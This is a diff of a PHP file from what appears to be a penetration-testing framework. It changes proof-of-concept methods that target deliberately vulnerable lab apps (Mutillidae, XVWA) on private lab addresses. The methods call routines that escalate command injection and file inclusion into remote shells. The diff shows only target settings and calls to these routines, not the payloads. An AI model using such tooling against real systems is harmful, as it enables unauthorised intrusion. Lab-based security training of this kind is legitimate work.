@@ -236,24 +236,24 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
             $this->notify("END XSS");
     }
 
-    public function poc4web2shell8param2rce(){ // OK Owasp,xvwa
+    public function poc4web2shell8param2rce(){ // No
         $this->ssTitre(__FUNCTION__);
-        $xvwa = "10.60.10.128";
+        $owasp = "10.60.10.130";
         $this->start("Web Vulnerabilities", "");
         $this->flag_poc = TRUE ;
         $this->flag_poc = FALSE ;
-        //$uri = "mutillidae/index.php?target_host=prof.hack.vlan&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
-        //$url = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
-        $uri = "xvwa/vulnerabilities/cmdi/index.php?target=10.60.10.1";
-        
-        $url = "http://$xvwa:80/$uri";
-        $eth = $this->ip4eth4target($xvwa);
+        $uri = "mutillidae/index.php?target_host=10.60.10.1&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
+        //$uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
+        //$uri = "xvwa/vulnerabilities/cmdi/index.php?target=10.60.10.1";
+        $methode_http = "GET";
+        $url = "http://$owasp:80/$uri";
+        $eth = $this->ip4eth4target($owasp);
         $domain = "hack.vlan";
         $OS = "linux";
-        //$url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
-        $url_ce = new PARAM($eth,$domain,$url,"target","10.60.10.1");
+
+        $url_ce = new PARAM($eth,$domain,$url,"target_host","10.60.10.1",$methode_http);
         $url_ce->poc($this->flag_poc);
-        $url_ce->ce2shell8param2rce($OS);
+        $url_ce->ce2shell8param($OS);
     }
     
     public function poc4web2shell8param2rfi(){ // OK Owasp
@@ -719,7 +719,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $eth = $this->ip4eth4target($ip);
         $domain = "hack.vlan";
         $OS = "linux";
-        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
+        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan","GET");
         
         $url_fi->poc($this->flag_poc);
         $url_fi->ce2shell8php2module($OS);
@@ -738,7 +738,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $eth = $this->ip4eth4target($ip);
         $domain = "hack.vlan";
         $OS = "linux";
-        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
+        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan","GET");
         
         $url_fi->poc($this->flag_poc);
         $url_fi->ce2shell8php2expect($OS);
@@ -786,7 +786,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $eth = $this->ip4eth4target($ip);
         $domain = "hack.vlan";
         $OS = "linux";
-        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
+        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan","GET");
         
         $url_fi->poc($this->flag_poc);
         $url_fi->ce2shell8php2wrapper($OS);
